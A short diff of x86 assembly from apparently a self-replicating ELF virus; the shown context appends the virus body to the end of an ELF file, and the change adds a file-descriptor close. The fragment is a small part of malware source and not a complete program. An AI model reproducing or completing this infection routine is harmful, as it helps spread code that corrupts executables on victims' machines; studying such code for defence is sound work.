@@ -71,6 +71,7 @@ _start:
 	add ecx, next_i-_start		;add ecx the offset from next_i to _start, now ecx points at _start address
 	lseek eax, 0, SEEK_END		;jump with the ELF file descriptor to it's end
 	write eax, ecx, virus_end-_start
+	close eax
 	jmp VirusExit
 	
 	_print_failure:
